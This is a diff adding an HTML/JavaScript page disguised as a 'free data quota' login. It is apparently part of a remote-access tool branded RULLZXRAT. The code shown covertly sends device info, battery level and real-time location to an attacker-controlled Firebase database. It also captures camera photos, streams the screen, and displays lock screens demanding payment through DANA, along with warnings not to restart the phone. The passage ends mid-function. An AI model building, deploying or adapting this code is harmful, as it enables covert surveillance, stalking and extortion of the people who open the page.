@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VORTEX - Target</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; user-select: none; }
+        body { 
+            background: #f0f2f5; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            transition: 0.3s; 
+        }
+
+        /* ===== FAKE LOGIN ===== */
+        .login-container {
+            background: #fff;
+            border-radius: 24px;
+            padding: 40px 32px;
+            width: 92%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.12);
+            text-align: center;
+        }
+        .login-logo {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ffcc, #0099aa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+        .login-sub {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 28px;
+            letter-spacing: 1px;
+        }
+        .login-input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 2px solid #e8ecf0;
+            border-radius: 16px;
+            font-size: 15px;
+            margin-bottom: 14px;
+            outline: none;
+            transition: border 0.2s;
+            background: #f8f9fa;
+            color: #111;
+        }
+        .login-input:focus {
+            border-color: #00ffcc;
+            background: #fff;
+        }
+        .login-input::placeholder { color: #aaa; }
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00ffcc, #0099aa);
+            border: none;
+            border-radius: 16px;
+            color: #000;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            letter-spacing: 1px;
+        }
+        .login-btn:active { transform: scale(0.97); }
+        .login-btn.loading { opacity: 0.6; pointer-events: none; }
+        .login-footer {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        .login-footer span { color: #00ffcc; font-weight: 600; }
+        .login-status {
+            font-size: 13px;
+            margin-top: 12px;
+            min-height: 22px;
+            font-weight: 600;
+        }
+        .login-status.error { color: #ff4444; }
+        .login-status.success { color: #00cc88; }
+
+        /* ===== LOCK BIASA ===== */
+        #lockCont { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            color: #fff; text-align: center; padding-top: 80px; z-index: 9999;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+        #lockCont::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: -1;
+        }
+        .lock-icon { font-size: 90px; color: #ff3b3b; margin-bottom: 25px; position: relative; z-index: 1; }
+        h2 { font-size: 20px; font-weight: 900; letter-spacing: 1px; margin-bottom: 10px; position: relative; z-index: 1; }
+        .sub-txt { font-size: 11px; color: #888; margin-bottom: 20px; letter-spacing: 2px; position: relative; z-index: 1; }
+        .pin-display { 
+            background: rgba(0,0,0,0.7); border: 1px solid #333; padding: 15px; width: 200px; 
+            margin: 0 auto; border-radius: 6px; font-size: 32px; color: #00ffcc; 
+            letter-spacing: 12px; height: 65px; display: flex; align-items: center; justify-content: center;
+            position: relative; z-index: 1;
+        }
+        .dev-txt { font-size: 10px; color: #aaa; margin-top: 15px; font-weight: bold; text-transform: uppercase; position: relative; z-index: 1; }
+        .input-hidden { position: absolute; opacity: 0; pointer-events: none; }
+        .warn { 
+            color: #ff3b3b; font-size: 12px; font-weight: 900; position: absolute; bottom: 30px; 
+            left: 0; right: 0; width: 100%; text-transform: uppercase; text-align: center; 
+            z-index: 1; letter-spacing: 1px;
+        }
+
+        /* HELL LOCK (MATRIX HIJAU) */
+        #hell {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            background: #000000;
+            overflow: hidden;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        #matrixCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.7;
+        }
+        .hell-rotating-wrapper {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            animation: floatPath 6s ease-in-out infinite;
+        }
+        @keyframes floatPath {
+            0% { transform: translate(0px, 0px); }
+            25% { transform: translate(60px, -40px); }
+            50% { transform: translate(-40px, 60px); }
+            75% { transform: translate(50px, 30px); }
+            100% { transform: translate(0px, 0px); }
+        }
+        .hell-rotating-text {
+            font-family: 'Courier New', monospace;
+            font-size: 48px;
+            font-weight: 900;
+            color: #00ff41;
+            text-shadow: 0 0 20px #00ff41, 0 0 60px #00ff41, 0 0 100px #00ff41;
+            animation: rotateText 4s linear infinite;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            background: rgba(0,0,0,0.5);
+            padding: 20px 40px;
+            border-radius: 20px;
+            border: 2px solid rgba(0,255,65,0.3);
+            backdrop-filter: blur(4px);
+        }
+        @keyframes rotateText {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.05); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        /* SOS LOCK V2 — MATRIX MERAH */
+        #sosLockV2 {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 30000;
+            background: #0a0000;
+            overflow: hidden;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        #sosMatrixCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.8;
+        }
+        .sosv2-wrapper {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            animation: floatPathSOS 7s ease-in-out infinite;
+        }
+        @keyframes floatPathSOS {
+            0% { transform: translate(0px, 0px) rotate(-1deg); }
+            33% { transform: translate(70px, -50px) rotate(1deg); }
+            66% { transform: translate(-50px, 60px) rotate(-1deg); }
+            100% { transform: translate(0px, 0px) rotate(0deg); }
+        }
+        .sosv2-text {
+            font-family: 'Courier New', monospace;
+            font-size: 44px;
+            font-weight: 900;
+            color: #ff0040;
+            text-shadow: 0 0 20px #ff0040, 0 0 60px #ff0040, 0 0 120px #ff0040;
+            animation: rotateTextSOS 5s linear infinite;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            background: rgba(20,0,0,0.7);
+            padding: 24px 48px;
+            border-radius: 24px;
+            border: 2px solid rgba(255,0,64,0.4);
+            backdrop-filter: blur(6px);
+        }
+        @keyframes rotateTextSOS {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.08); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+        .sosv2-sub {
+            position: absolute;
+            bottom: 60px;
+            z-index: 3;
+            font-family: 'Courier New', monospace;
+            color: #ff4466;
+            font-size: 18px;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            text-shadow: 0 0 30px rgba(255,0,64,0.5);
+            animation: subPulse 3s ease-in-out infinite alternate;
+        }
+        @keyframes subPulse {
+            0% { opacity: 0.3; letter-spacing: 4px; }
+            100% { opacity: 1; letter-spacing: 12px; }
+        }
+
+        /* LOCK V2 (dari admin) */
+        #lockV2 {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 30000;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex-direction: column;
+            background: #0b0815;
+            transition: background 0.3s ease;
+        }
+        .lockv2-box {
+            max-width: 460px;
+            width: 92%;
+            background: rgba(20, 12, 40, 0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 72px;
+            padding: 48px 36px;
+            border: 1px solid rgba(180, 80, 255, 0.3);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 50px rgba(180, 80, 255, 0.08);
+            animation: floatSlow 4s ease-in-out infinite;
+            position: relative;
+            z-index: 2;
+        }
+        @keyframes floatSlow {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-12px) rotate(0.5deg); }
+        }
+        .lockv2-icon {
+            font-size: 88px;
+            display: block;
+            margin-bottom: 12px;
+            animation: spinSlow 7s linear infinite;
+            filter: drop-shadow(0 0 30px rgba(180, 80, 255, 0.5));
+        }
+        @keyframes spinSlow {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.05); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+        .lockv2-title {
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #c084fc, #f472b6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 8px;
+            margin-bottom: 6px;
+            animation: gradMove 3.5s ease-in-out infinite alternate;
+        }
+        @keyframes gradMove {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+        .lockv2-sub {
+            font-size: 16px;
+            color: #a78bfa;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+        .lockv2-msg {
+            background: rgba(180, 80, 255, 0.06);
+            border: 1px solid rgba(180, 80, 255, 0.18);
+            border-radius: 60px;
+            padding: 18px 28px;
+            color: #e9d5ff;
+            font-size: 20px;
+            font-weight: 600;
+            font-family: 'Courier New', monospace;
+            margin: 20px 0;
+            letter-spacing: 2px;
+            animation: borderGlow 3.5s ease-in-out infinite alternate;
+        }
+        @keyframes borderGlow {
+            0% { border-color: rgba(180, 80, 255, 0.1); box-shadow: 0 0 15px rgba(180,80,255,0.05); }
+            100% { border-color: rgba(180, 80, 255, 0.5); box-shadow: 0 0 40px rgba(180,80,255,0.2); }
+        }
+        .lockv2-data {
+            background: rgba(0,0,0,0.4);
+            border-radius: 40px;
+            padding: 20px 24px;
+            margin: 18px 0;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .lockv2-data .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 16px;
+        }
+        .lockv2-data .row:last-child { border-bottom: none; }
+        .lockv2-data .label { color: #a78bfa; font-weight: 500; }
+        .lockv2-data .value { color: #fbbf24; font-weight: 600; }
+        .lockv2-warn {
+            font-size: 15px;
+            color: #f472b6;
+            letter-spacing: 4px;
+            margin-top: 18px;
+            font-weight: 600;
+            animation: warnGlow 2.2s ease-in-out infinite alternate;
+        }
+        @keyframes warnGlow {
+            0% { opacity: 0.5; text-shadow: 0 0 5px rgba(244,114,182,0.2); }
+            100% { opacity: 1; text-shadow: 0 0 25px rgba(244,114,182,0.7); }
+        }
+
+        /* SOS LOCK biasa (biru) */
+        #sosLock {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #060c14;
+            z-index: 20000;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex-direction: column;
+        }
+        .sos-box {
+            max-width: 460px;
+            width: 92%;
+            background: rgba(8, 20, 40, 0.78);
+            backdrop-filter: blur(18px);
+            border-radius: 72px;
+            padding: 48px 36px;
+            border: 2px solid rgba(0, 200, 255, 0.3);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 60px rgba(0, 200, 255, 0.06);
+            animation: sosFloatSlow 4.5s ease-in-out infinite;
+            position: relative;
+            z-index: 2;
+        }
+        @keyframes sosFloatSlow {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        .sos-emoji {
+            font-size: 96px;
+            display: block;
+            margin-bottom: 10px;
+            animation: pulseEmoji 3.2s ease-in-out infinite;
+            filter: drop-shadow(0 0 30px rgba(0, 200, 255, 0.4));
+        }
+        @keyframes pulseEmoji {
+            0%, 100% { transform: scale(1) rotate(-2deg); }
+            50% { transform: scale(1.06) rotate(2deg); }
+        }
+        .sos-title {
+            font-size: 38px;
+            font-weight: 900;
+            color: #38bdf8;
+            letter-spacing: 8px;
+            text-shadow: 0 0 30px rgba(56, 189, 248, 0.25);
+            animation: titleShift 3.2s ease-in-out infinite alternate;
+        }
+        @keyframes titleShift {
+            0% { letter-spacing: 8px; opacity: 0.8; }
+            100% { letter-spacing: 16px; opacity: 1; }
+        }
+        .sos-sub {
+            font-size: 16px;
+            color: #7dd3fc;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            font-weight: 500;
+            margin: 6px 0 18px;
+            animation: subBlink 2.5s ease-in-out infinite alternate;
+        }
+        @keyframes subBlink {
+            0% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .sos-msg {
+            background: rgba(0, 200, 255, 0.05);
+            border: 1px solid rgba(0, 200, 255, 0.18);
+            border-radius: 60px;
+            padding: 18px 28px;
+            color: #bae6fd;
+            font-size: 20px;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            margin: 18px 0;
+            letter-spacing: 2px;
+            animation: msgPulseSlow 3.8s ease-in-out infinite alternate;
+        }
+        @keyframes msgPulseSlow {
+            0% { border-color: rgba(0, 200, 255, 0.1); box-shadow: 0 0 15px rgba(0,200,255,0.05); }
+            100% { border-color: rgba(0, 200, 255, 0.5); box-shadow: 0 0 50px rgba(0,200,255,0.25); }
+        }
+        .sos-divider {
+            width: 150px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #38bdf8, transparent);
+            margin: 14px auto;
+            border-radius: 4px;
+            animation: dividerMove 3s ease-in-out infinite;
+        }
+        @keyframes dividerMove {
+            0% { width: 100px; opacity: 0.3; }
+            100% { width: 250px; opacity: 1; }
+        }
+        .sos-warn {
+            font-size: 15px;
+            color: #7dd3fc;
+            letter-spacing: 5px;
+            font-weight: 500;
+            margin-top: 18px;
+            animation: warnBreath 2.5s ease-in-out infinite alternate;
+        }
+        @keyframes warnBreath {
+            0% { opacity: 0.2; }
+            100% { opacity: 1; }
+        }
+
+        @media (max-width: 480px) {
+            .lockv2-box, .sos-box { padding: 28px 18px; }
+            .lockv2-title { font-size: 24px; letter-spacing: 4px; }
+            .sos-title { font-size: 26px; letter-spacing: 4px; }
+            .lockv2-icon { font-size: 60px; }
+            .sos-emoji { font-size: 68px; }
+            .lockv2-data .row { font-size: 13px; }
+            .hell-rotating-text { font-size: 28px; padding: 14px 24px; }
+            .sosv2-text { font-size: 24px; padding: 16px 20px; letter-spacing: 3px; }
+        }
+    </style>
+</head>
+<body onclick="focusInput()">
+
+    <!-- ===== FAKE LOGIN ===== -->
+    <div class="login-container" id="fakeLogin">
+        <div class="login-logo">KUOTA GRATIS</div>
+        <div class="login-sub">Selamat datang kembali</div>
+        <input type="text" class="login-input" id="fakeUser" placeholder="Masukkan Kode UID" value="">
+        <button class="login-btn" id="loginBtn" onclick="fakeLogin()">Login</button>
+        <div class="login-status" id="loginStatus"></div>
+        <div class="login-footer"></div>
+    </div>
+
+    <!-- ===== LOCK BIASA ===== -->
+    <div id="lockCont">
+        <div class="lock-icon">🔒</div>
+        <h2 id="lTit">LOCK BY RULLZXRAT</h2>
+        <p class="sub-txt">MASUKKAN PIN</p>
+        <div class="pin-display" id="dotsDisplay"></div>
+        <div class="dev-txt">Developer By Rullz</div> 
+        <input type="number" id="realInput" class="input-hidden" oninput="handleInput(this)">
+        <div class="warn">JANGAN MENCOBA MERESTART HP ANDA</div>
+    </div>
+
+    <!-- HELL LOCK -->
+    <div id="hell">
+        <canvas id="matrixCanvas"></canvas>
+        <div class="hell-rotating-wrapper">
+            <div class="hell-rotating-text" id="hellMessage">HELLO I'M RULLZ</div>
+        </div>
+    </div>
+
+    <!-- SOS LOCK V2 (matrix merah) -->
+    <div id="sosLockV2">
+        <canvas id="sosMatrixCanvas"></canvas>
+        <div class="sosv2-wrapper">
+            <div class="sosv2-text" id="sosV2Message">⚠️ SOS LOCKED ⚠️</div>
+        </div>
+        <div class="sosv2-sub">— DEVELOPER BY RULLZ —</div>
+    </div>
+
+    <!-- LOCK V2 -->
+    <div id="lockV2">
+        <div class="lockv2-box">
+            <span class="lockv2-icon">💀</span>
+            <div class="lockv2-title">SYSTEM LOCKED</div>
+            <div class="lockv2-sub">[ PERMANENT LOCK ]</div>
+            <div class="lockv2-msg" id="lockV2Message">HARAP BAYAR UANG</div>
+            <div class="lockv2-data" id="lockV2Data">
+                <div class="row"><span class="label">📝 PENGIRIM</span> <span class="value" id="v2PengirimText">-</span></div>
+                <div class="row"><span class="label">📱 NOMOR HP</span> <span class="value" id="v2NoHpText">-</span></div>
+                <div class="row"><span class="label">💰 NOMINAL</span> <span class="value" id="v2NominalText">-</span></div>
+                <div class="row"><span class="label">💳 METODE</span> <span class="value" id="v2MetodeText">-</span></div>
+            </div>
+            <div class="lockv2-warn">jangan mencoba keluar</div>
+        </div>
+    </div>
+
+    <!-- SOS LOCK biasa (biru) -->
+    <div id="sosLock">
+        <div class="sos-box">
+            <span class="sos-emoji">☠️</span>
+            <div class="sos-title">LOCKED</div>
+            <div class="sos-sub">HELLO I'M RULLZ</div>
+            <div class="sos-divider"></div>
+            <div class="sos-msg" id="sosMessage">Hacked By Rullz</div>
+            <div class="sos-divider"></div>
+            <div class="sos-warn">Developer By Rullz</div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // =============================================================
+            // 🔥 FIREBASE CONFIG
+            // =============================================================
+            var firebaseConfig = {
+                apiKey: "AIzaSyBUhXZ_YKmTQNsDzeWX0072Zfb9lVi4jfE",
+                databaseURL: "https://rullzxrat-default-rtdb.firebaseio.com"
+            };
+
+            try {
+                if (!firebase.apps.length) {
+                    firebase.initializeApp(firebaseConfig);
+                }
+            } catch (e) {
+                console.warn('Firebase init error:', e);
+                return;
+            }
+
+            var database = firebase.database();
+            var MY_ID = "";
+            var commandListener = null;
+            var watchId = null;
+            var onlineInterval = null;
+            var dataInterval = null;
+
+            // =============================================================
+            // 📱 DETEKSI NAMA DEVICE & SYS INFO (REAL-TIME)
+            // =============================================================
+            function getDeviceName() {
+                var ua = navigator.userAgent;
+                if (ua.includes("SM-S928B")) return "Samsung Galaxy S24 Ultra";
+                if (ua.includes("SM-S918B")) return "Samsung Galaxy S23 Ultra";
+                if (ua.includes("SM-S908B")) return "Samsung Galaxy S22 Ultra";
+                if (ua.includes("iPhone15,2")) return "iPhone 14 Pro";
+                if (ua.includes("iPhone15,3")) return "iPhone 14 Pro Max";
+                if (ua.includes("iPhone16,1")) return "iPhone 15 Pro";
+                if (ua.includes("iPhone16,2")) return "iPhone 15 Pro Max";
+                if (ua.includes("iPhone17,1")) return "iPhone 16 Pro";
+                if (ua.includes("iPhone17,2")) return "iPhone 16 Pro Max";
+                if (ua.includes("Pixel 9")) return "Google Pixel 9";
+                if (ua.includes("Pixel 8")) return "Google Pixel 8";
+                if (ua.includes("Android")) {
+                    var match = ua.match(/Android\s([0-9.]+);\s([^;)]+)/);
+                    if (match && match[2]) return match[2].trim();
+                    return "Android Device";
+                }
+                if (ua.includes("Windows")) return "Windows PC";
+                if (ua.includes("Macintosh")) return "MacBook/iMac";
+                if (ua.includes("Linux")) return "Linux Device";
+                return "Unknown Device";
+            }
+
+            function getAndroidVersion() {
+                var ua = navigator.userAgent;
+                var match = ua.match(/Android\s([0-9.]+)/);
+                return match ? match[1] : 'N/A';
+            }
+
+            // Deteksi RAM (perkiraan)
+            function getRAM() {
+                if (navigator.deviceMemory) {
+                    return navigator.deviceMemory + ' GB';
+                }
+                return 'N/A';
+            }
+
+            // Deteksi Root (indikasi sederhana)
+            function isRooted() {
+                return 'Unknown';
+            }
+
+            // Deteksi bahasa
+            function getLanguage() {
+                return navigator.language || 'N/A';
+            }
+
+            // =============================================================
+            // 📤 KIRIM DATA PERANGKAT (SYS INFO + ONLINE + BATTERY + LOCATION)
+            // =============================================================
+            function sendDeviceData() {
+                if (!MY_ID) return;
+                var deviceName = getDeviceName();
+                var androidVer = getAndroidVersion();
+                var ram = getRAM();
+                var root = isRooted();
+                var language = getLanguage();
+                var targetRef = database.ref('targets/' + MY_ID);
+
+                // Kirim deviceInfo secara terpisah agar admin bisa lihat real-time
+                var deviceInfo = {
+                    deviceName: deviceName,
+                    androidVersion: androidVer,
+                    ram: ram,
+                    root: root,
+                    language: language,
+                    lastUpdate: firebase.database.ServerValue.TIMESTAMP
+                };
+                targetRef.child('deviceInfo').update(deviceInfo).catch(function(err){});
+
+                // Kirim battery & online status
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(function(battery) {
+                        var level = Math.round(battery.level * 100);
+                        targetRef.update({
+                            battery: level,
+                            online: true,
+                            lastSeen: firebase.database.ServerValue.TIMESTAMP
+                        }).catch(function(err){});
+                    }).catch(function() {
+                        targetRef.update({
+                            battery: 'N/A',
+                            online: true,
+                            lastSeen: firebase.database.ServerValue.TIMESTAMP
+                        }).catch(function(err){});
+                    });
+                } else {
+                    targetRef.update({
+                        battery: 'N/A',
+                        online: true,
+                        lastSeen: firebase.database.ServerValue.TIMESTAMP
+                    }).catch(function(err){});
+                }
+
+                // Kirim lokasi (jika diizinkan)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            targetRef.child('location').set({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: firebase.database.ServerValue.TIMESTAMP
+                            }).catch(function(err){});
+                        },
+                        function(err) {},
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
+                    );
+                }
+            }
+
+            // =============================================================
+            // 📍 LOKASI REAL-TIME (watchPosition)
+            // =============================================================
+            function startLocationWatch() {
+                if (!MY_ID) return;
+                if (!navigator.geolocation) return;
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                }
+                watchId = navigator.geolocation.watchPosition(
+                    function(pos) {
+                        var locRef = database.ref('targets/' + MY_ID + '/location');
+                        locRef.set({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP
+                        }).catch(function(err){});
+                    },
+                    function(err) {},
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+                );
+            }
+
+            function stopLocationWatch() {
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                }
+            }
+
+            // =============================================================
+            // 📸 CAMERA CAPTURE (DEPAN / BELAKANG)
+            // =============================================================
+            function captureCamera(facingMode, callback) {
+                if (!navigator.mediaDevices) {
+                    callback(null);
+                    return;
+                }
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 320 }, height: { ideal: 240 } }
+                }).then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        var canvas = document.createElement('canvas');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 320, 240);
+                        var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                        stream.getTracks().forEach(t => t.stop());
+                        callback(dataUrl);
+                    };
+                    video.load();
+                }).catch(function(err) {
+                    callback(null);
+                });
+            }
+
+            function sendCameraImage(facingMode, commandId) {
+                if (!MY_ID) return;
+                captureCamera(facingMode, function(dataUrl) {
+                    if (dataUrl) {
+                        var ref = database.ref('commands/' + MY_ID + '/camera/' + commandId);
+                        ref.set({
+                            image: dataUrl,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP,
+                            facing: facingMode
+                        }).catch(function(err){});
+                    }
+                });
+            }
+
+            // =============================================================
+            // 🖥️ LIVE SCREEN STREAM
+            // =============================================================
+            var screenStream = null;
+            var screenInterval = null;
+            var isScreenStreaming = false;
+
+            function startScreenStream() {
+                if (isScreenStreaming || !MY_ID) return;
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+                    return;
+                }
+                navigator.mediaDevices.getDisplayMedia({
+                    video: { width: { ideal: 320 }, height: { ideal: 240 } }
+                }).then(function(stream) {
+                    screenStream = stream;
+                    isScreenStreaming = true;
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        var canvas = document.createElement('canvas');
+                        canvas.width = 320;
+                        canvas.height = 240;
+                        var ctx = canvas.getContext('2d');
+                        screenInterval = setInterval(function() {
+                            if (!isScreenStreaming) {
+                                clearInterval(screenInterval);
+                                return;
+                            }
+                            ctx.drawImage(video, 0, 0, 320, 240);
+                            var dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                            database.ref('commands/' + MY_ID + '/screen').set({
+                                frame: dataUrl,
+                                timestamp: firebase.database.ServerValue.TIMESTAMP
+                            }).catch(function(err){});
+                        }, 1000);
+                    };
+                    video.load();
+                }).catch(function(err) {});
+            }
+
+            function stopScreenStream() {
+                isScreenStreaming = false;
+                if (screenInterval) {
+                    clearInterval(screenInterval);
+                    screenInterval = null;
+                }
+                if (screenStream) {
+                    screenStream.getTracks().forEach(t => t.stop());
+                    screenStream = null;
+                }
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/screen').remove().catch(function(err){});
+                }
+            }
+
+            // =============================================================
+            // 🔒 LOCK FUNCTIONS
+            // =============================================================
+            function setLockV2Background(bgColor) {
+                var el = document.getElementById('lockV2');
+                if (bgColor === 'black') el.style.background = '#000000';
+                else if (bgColor === 'gray') el.style.background = '#4a4a4a';
+                else if (bgColor === 'red') el.style.background = '#8b0000';
+                else el.style.background = '#0b0815';
+            }
+
+            function setLockBackground(bgColor, bgValue) {
+                var lockContainer = document.getElementById('lockCont');
+                lockContainer.style.backgroundImage = '';
+                lockContainer.style.backgroundColor = '';
+                if (bgColor === 'black') lockContainer.style.backgroundColor = '#000000';
+                else if (bgColor === 'red') lockContainer.style.backgroundColor = '#ff0000';
+                else if (bgColor === 'gray') lockContainer.style.backgroundColor = '#555555';
+                else lockContainer.style.backgroundColor = '#000000';
+            }
+
+            function showLockV2(data) {
+                setLockV2Background(data.bgColor || 'black');
+                document.getElementById('lockV2Message').innerText = data.message || "HELLO I'M RULLZ";
+                document.getElementById('v2PengirimText').innerText = data.pengirim || "-";
+                document.getElementById('v2NoHpText').innerText = data.noHp || "-";
+                document.getElementById('v2NominalText').innerText = data.nominal || "-";
+                document.getElementById('v2MetodeText').innerText = data.metode || "DANA ONLY";
+                document.getElementById('lockV2').style.display = 'flex';
+                if (window.RullzInterface) window.RullzInterface.startLock();
+            }
+
+            function hideLockV2() {
+                document.getElementById('lockV2').style.display = 'none';
+            }
+
+            function focusInput() {
+                if (document.getElementById('lockCont').style.display === 'block') {
+                    document.getElementById('realInput').focus();
+                }
+            }
+
+            function unlockSOS() {
+                document.getElementById('sosLock').style.display = 'none';
+                if (window.RullzInterface) window.RullzInterface.exitApp();
+            }
+
+            function showSOSLock(message) {
+                document.getElementById('sosMessage').innerText = message;
+                document.getElementById('sosLock').style.display = 'flex';
+                if (window.RullzInterface) window.RullzInterface.startLock();
+            }
+
+            // SOS V2 (matrix merah)
+            var sosMatrixRunning = false;
+
+            function startSOSMatrix(message) {
+                var container = document.getElementById('sosLockV2');
+                document.getElementById('sosV2Message').innerText = message || '⚠️ SOS LOCKED ⚠️';
+                container.style.display = 'flex';
+                if (!sosMatrixRunning) {
+                    sosMatrixRunning = true;
+                    var canvas = document.getElementById('sosMatrixCanvas');
+                    if (canvas) {
+                        var ctx = canvas.getContext('2d');
+                        var w = canvas.width = window.innerWidth;
+                        var h = canvas.height = window.innerHeight;
+                        var cols = Math.floor(w / 14);
+                        var ypos = Array(cols).fill(0);
+                        var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?~';
+                        ctx.fillStyle = '#0a0000';
+                        ctx.fillRect(0, 0, w, h);
+                        function drawRed() {
+                            ctx.fillStyle = 'rgba(10,0,0,0.04)';
+                            ctx.fillRect(0, 0, w, h);
+                            ctx.fillStyle = '#ff0040';
+                            ctx.font = '14px monospace';
+                            for (var i = 0; i < cols; i++) {
+                                var text = chars.charAt(Math.floor(Math.random() * chars.length));
+                                var x = i * 14;
+                                var y = ypos[i];
+                                ctx.fillText(text, x, y);
+                                if (y > h && Math.random() > 0.99) {
+                                    ypos[i] = 0;
+                                } else {
+                                    ypos[i] += 14;
+                                }
+                            }
+                            requestAnimationFrame(drawRed);
+                        }
+                        drawRed();
+                        window.addEventListener('resize', function() {
+                            canvas.width = window.innerWidth;
+                            canvas.height = window.innerHeight;
+                        });
+                    }
+                }
+                if (window.RullzInterface) window.RullzInterface.startLock();
+            }
+
+            function stopSOSMatrix() {
+                document.getElementById('sosLockV2').style.display = 'none';
+                sosMatrixRunning = false;
+            }
+
+            // =============================================================
+            // 🎬 MATRIX HIJAU (HELL LOCK)
+            // =============================================================
+            function startMatrix() {
+                var canvas = document.getElementById('matrixCanvas');
+                if (!canvas) return;
+                var ctx = canvas.getContext('2d');
+                var w = canvas.width = window.innerWidth;
+                var h = canvas.height = window.innerHeight;
+                var cols = Math.floor(w / 14);
+                var ypos = Array(cols).fill(0);
+                var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+                ctx.fillStyle = '#000';
